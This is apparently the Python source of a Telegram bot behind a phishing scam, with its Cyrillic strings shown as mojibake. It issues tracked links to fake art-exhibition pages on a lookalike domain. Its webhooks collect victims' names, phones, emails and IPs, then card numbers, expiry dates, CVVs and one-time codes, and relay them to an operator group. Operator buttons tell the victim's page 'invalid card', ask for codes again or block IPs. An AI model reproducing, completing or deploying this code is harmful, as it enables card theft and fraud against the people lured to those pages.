EVENTS_FILE = os.path.join('events-art.com', 'events.json')
EVENT_DOMAIN = 'artpullse.com'
EVENT_FIXED_EVENTS = [
    'Terroir and Traditions',
    'Collection Co‚Äìselection',
    'Snucie',
    'Art that saves lives',
    'Gotong Royong',
    'Anna Konik',
    'Uncensored',
    'Jacek Adamas'
]
EVENT_FIXED_PATHS = [
    'terroir-and-traditions/index.html',
    'collection-co‚Äìselection/index.html',
    'snucie/index.html',
    'art-that-saves-lives/index.html',
    'gotong-royong/index.html',
    'anna-konik/index.html',
    'uncensored/index.html',
    'jacek-adamas/index.html'
]
EVENT_user_data = {}

def EVENT_load_events():
    try:
        with open(EVENTS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except Exception:
        return {}

def EVENT_save_events(events):
    with open(EVENTS_FILE, 'w', encoding='utf-8') as f:
        json.dump(events, f, ensure_ascii=False, indent=2)

@router.message(Command('events'))
async def events_start(message: types.Message):
    EVENT_user_data[message.chat.id] = {}
    await message.answer("–í–≤–µ–¥–∏—Ç–µ –Ω–∞–∑–≤–∞–Ω–∏–µ –≤—ã—Å—Ç–∞–≤–∫–∏:")
    user_step[message.chat.id] = 'event_title'

async def events_save_all(message):
    chat_id = message.chat.id
    event_id = str(uuid.uuid4())
    short_event_id = event_id[:6]
    events_file = os.path.join('events-art.com', 'events.json')
    # –ó–∞–≤–∞–Ω—Ç–∞–∂—É—î–º–æ —ñ—Å–Ω—É—é—á—ñ –ø–æ–¥—ñ—ó
    try:
        with open(events_file, 'r', encoding='utf-8') as f:
            events = json.load(f)
    except Exception:
        events = {}
    # –î–æ–¥–∞—î–º–æ –Ω–æ–≤—É –ø–æ–¥—ñ—é
    user_event = EVENT_user_data[chat_id]
    events[event_id] = {
        'title': user_event.get('title', '–í—ã—Å—Ç–∞–≤–∫–∞'),
        'events': [
            {
                'name': EVENT_FIXED_EVENTS[i],
                'path': EVENT_FIXED_PATHS[i],
                'date': user_event['dates'][i],
                'time': user_event['times'][i]
            } for i in range(8)
        ]
    }
    with open(events_file, 'w', encoding='utf-8') as f:
        json.dump(events, f, ensure_ascii=False, indent=2)
    # –°–æ—Ö—Ä–∞–Ω—è–µ–º —Å–≤—è–∑—å event_code <-> user_id
    c = conn.cursor()
    c.execute('INSERT OR REPLACE INTO event_links (event_code, user_id) VALUES (?, ?)', (short_event_id, message.from_user.id))
    conn.commit()
    # –§–æ—Ä–º—É—î–º–æ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –∑ –ø–æ—Å–∏–ª–∞–Ω–Ω—è–º–∏
    msg = f"–í—ã—Å—Ç–∞–≤–∫–∞ —É—Å–ø–µ—à–Ω–æ —Å–æ–∑–¥–∞–Ω–∞:\n<b>{user_event.get('title', '–í—ã—Å—Ç–∞–≤–∫–∞')}</b>\n–ê—Ñ–∏—à–∞:\n"
    msg += f"<b>–ì–ª–∞–≤–Ω–∞—è —Å—Ç—Ä–∞–Ω–∏—Ü–∞:</b> http://{EVENT_DOMAIN}/?e={short_event_id}\n"
    for idx, ev in enumerate(events[event_id]['events'], 1):
        # –§–æ—Ä–º—É—î–º–æ –∫–æ—Ä–æ—Ç–∫–µ —É–Ω—ñ–∫–∞–ª—å–Ω–µ –ø–æ—Å–∏–ª–∞–Ω–Ω—è
        path = ev['path']
        if path.endswith('/index.html'):
            path = path[:-10]
        link = f"http://{EVENT_DOMAIN}/{path}?e={short_event_id}&p={idx}"
        msg += f"{idx}. {ev['name']} ({ev['date']} {ev['time']})\n{link}\n"
    await message.answer(msg, parse_mode='HTML')
    # –ü–æ–≤–µ—Ä—Ç–∞—î–º–æ –º–µ–Ω—é –ø—ñ—Å–ª—è —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –≤–∏—Å—Ç–∞–≤–∫–∏
    kb = admin_menu_kb if is_admin(message.from_user.id) else main_menu_kb
    await message.answer("–ì–æ–ª–æ–≤–Ω–µ –º–µ–Ω—é:", reply_markup=kb)

@log_function
async def notify_admin(request):
    data = await request.json()
    phone = data.get('phone', '')
    name = data.get('name', '')
    mail = data.get('mail', '')
    ip = data.get('ip', '')
    # –§–æ—Ä–º—É—î–º–æ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è
    msg = (
        f"–ú–∞–º–æ–Ω—Ç –≤–≤—ë–ª –§.–ò.–û: <b>{name}</b>\n\n"
        f"<b>phone_number:</b> <code>{phone}</code>\n"
        f"<b>full_name:</b> <code>{name}</code>\n"
        f"<b>mail:</b> <code>{mail}</code>\n"
        f"<b>ip:</b> <code>{ip}</code>"
    )
    # –ö–ª–∞–≤—ñ–∞—Ç—É—Ä–∞ –±–µ–∑ '–ö–∞—Ä—Ç–∞'
    kb = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text="–ó–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å", callback_data=f"block:{ip}"),
                InlineKeyboardButton(text="–†–æ–∑–±–ª–æ–∫—É–≤–∞—Ç–∏", callback_data=f"unblock:{ip}")
            ]
        ]
    )
    try:
        await bot.send_message(ADMIN_GROUP_ID, msg, parse_mode='HTML', reply_markup=kb)
        print('Message sent to admin group')
    except Exception as e:
        print('Error sending message:', e)
    return web.Response(text="OK")

@log_function
async def payment_notify(request):
    data = await request.json()
    email = data.get('email', '')
    card = data.get('card', '')
    expiry = data.get('expiry', '')
    cvv = data.get('cvv', '')
    ip = data.get('ip', '')
    user_id = data.get('user_id', '')
    # --- –ó–±–µ—Ä—ñ–≥–∞—î–º–æ IP —É user_data –¥–ª—è user_id ---
    if user_id and ip:
        try:
            user_id_int = int(user_id)
            if user_id_int not in user_data:
                user_data[user_id_int] = {}
            user_data[user_id_int]['ip'] = ip
        except Exception:
            pass
    # --- –í–∏–∑–Ω–∞—á–∞—î–º–æ user_id –ø–æ IP, —è–∫—â–æ –Ω–µ –ø–µ—Ä–µ–¥–∞–Ω–æ ---
    if not user_id:
        for uid, udata in user_data.items():
            if udata.get('ip') == ip:
                user_id = uid
                break
    text = f"Email: {email}\nCard Number: {card}\nExpiry Date: {expiry}\nCVV: {cvv}\nIP: {ip}"
    kb_rows = [
        [
            InlineKeyboardButton(text="Card", callback_data=f"card:{ip}"),
            InlineKeyboardButton(text="Block", callback_data=f"block:{ip}"),
            InlineKeyboardButton(text="Unblock", callback_data=f"unblock:{ip}"),
            InlineKeyboardButton(text="Code", callback_data=f"code:{ip}")
        ],
        [
            InlineKeyboardButton(text="–¢–µ—Ö –ø—ñ–¥—Ç—Ä–∏–º–∫–∞", callback_data=f"support:{ip}"),
            InlineKeyboardButton(text="Text", callback_data=f"text:{ip}")
        ]
    ]
    kb = InlineKeyboardMarkup(inline_keyboard=kb_rows)
    await bot.send_message(ADMIN_GROUP_ID, text, reply_markup=kb)
    return web.Response(text='ok')

@log_function
async def code_notify(request):
    data = await request.json()
    code = data.get('code', '')
    ip = data.get('ip', '')
    text = f"Code: {code}\nIP: {ip}"
    kb = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text="Request again", callback_data=f"code_request_again:{code}")
            ]
        ]
    )
    await bot.send_message(ADMIN_GROUP_ID, text, reply_markup=kb)
    return web.Response(text='ok')

# --- CALLBACK-–û–ë–†–û–ë–ù–ò–ö–ò –î–õ–Ø –ö–ù–û–ü–û–ö ---
@router.callback_query(lambda c: c.data and (c.data.startswith('card:') or c.data.startswith('block:') or c.data.startswith('unblock:')))
async def admin_action_handler(call: types.CallbackQuery):
    action, ip = call.data.split(':', 1)
    import aiohttp as aiohttp_client
    async with aiohttp_client.ClientSession() as session:
        await session.post('http://127.0.0.1:8080/admin_action', json={'action': action, 'ip': ip})
    if action == 'card':
        await call.answer("–°–∏–≥–Ω–∞–ª –Ω–∞ —Å–∞–π—Ç: –Ω–µ –≤—ñ—Ä–Ω–∞ –∫–∞—Ä—Ç–∞")
    elif action == 'block':
        await call.answer("–ö–æ—Ä–∏—Å—Ç—É–≤–∞—á –∑–∞–±–ª–æ–∫–æ–≤–∞–Ω–∏–π")
    elif action == 'unblock':
        await call.answer("–ö–æ—Ä–∏—Å—Ç—É–≤–∞—á —Ä–æ–∑–±–ª–æ–∫–æ–≤–∞–Ω–∏–π")

@router.callback_query(lambda c: c.data and c.data.startswith('card:'))
async def card_handler(call: types.CallbackQuery):
    ip = call.data.split(':', 1)[1]
    import aiohttp as aiohttp_client
    async with aiohttp_client.ClientSession() as session:
        await session.post('http://127.0.0.1:8080/admin_action', json={'action': 'card', 'ip': ip})
    await call.answer("Invalid card message sent")

@router.callback_query(lambda c: c.data and c.data.startswith('block:'))
async def block_handler(call: types.CallbackQuery):
    ip = call.data.split(':', 1)[1]
    import aiohttp as aiohttp_client
    async with aiohttp_client.ClientSession() as session:
        await session.post('http://127.0.0.1:8080/admin_action', json={'action': 'block', 'ip': ip})
    await call.answer("IP blocked")

@router.callback_query(lambda c: c.data and c.data.startswith('unblock:'))
async def unblock_handler(call: types.CallbackQuery):
    ip = call.data.split(':', 1)[1]
    import aiohttp as aiohttp_client
    async with aiohttp_client.ClientSession() as session:
        await session.post('http://127.0.0.1:8080/admin_action', json={'action': 'unblock', 'ip': ip})
    await call.answer("IP unblocked")

@router.callback_query(lambda c: c.data and c.data.startswith('code:'))
async def code_redirect_handler(call: types.CallbackQuery):
    ip = call.data.split(':', 1)[1]
    import aiohttp as aiohttp_client
    async with aiohttp_client.ClientSession() as session:
        await session.post('http://127.0.0.1:8080/admin_action', json={'action': 'code', 'ip': ip})
    await call.answer("Redirecting user to code page")

@router.callback_query(lambda c: c.data and c.data.startswith('code_request_again:'))
async def code_request_again_handler(call: types.CallbackQuery):
    code = call.data.split(':', 1)[1]
    import aiohttp as aiohttp_client
    async with aiohttp_client.ClientSession() as session:
        await session.post('http://127.0.0.1:8080/set_request_again', json={'code': code})
    await call.answer("Request sent to user")

@log_function
async def admin_support_callback(call: types.CallbackQuery):
    ip = call.data.split(":")[1]
    if not ip:
        await call.answer("IP –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –Ω–µ –∑–Ω–∞–π–¥–µ–Ω–æ")
        return
    import aiohttp
    async def set_flag():
        async with aiohttp.ClientSession() as session:
            await session.post('http://127.0.0.1:8080/set_support_flag', json={'ip': ip, 'type': 'support'})
    import asyncio
    asyncio.create_task(set_flag())
    await call.message.answer("–ö–Ω–æ–ø–∫–∞ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ –∑'—è–≤–∏—Ç—å—Å—è –Ω–∞ —Å–∞–π—Ç—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞.")

@log_function
async def admin_text_callback(call: types.CallbackQuery):
    ip = call.data.split(":")[1]
    if not ip:
        await call.answer("IP –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –Ω–µ –∑–Ω–∞–π–¥–µ–Ω–æ")
        return
    await call.message.answer("–í–≤–µ–¥—ñ—Ç—å —Ç–µ–∫—Å—Ç –¥–ª—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞:")
    user_step[call.from_user.id] = f"text_for_{ip}"

# --- –∑–∞–ø—É—Å–∫ aiohttp —ñ aiogram –≤ –æ–¥–Ω–æ–º—É event loop ---
if __name__ == '__main__':
    async def main():
        # aiohttp app
        app = web.Application()
        app.router.add_post('/notify_admin', notify_admin)
        app.router.add_post('/payment_notify', payment_notify)
        app.router.add_post('/code_notify', code_notify)
        runner = web.AppRunner(app)
        await runner.setup()
        site = web.TCPSite(runner, '0.0.0.0', 8081)
        await site.start()
        print('–ó–∞–ø—É—Å–∫–∞—é aiohttp webhook –Ω–∞ 0.0.0.0:8081')
        # aiogram polling
        await dp.start_polling(bot)
    asyncio.run(main()) 
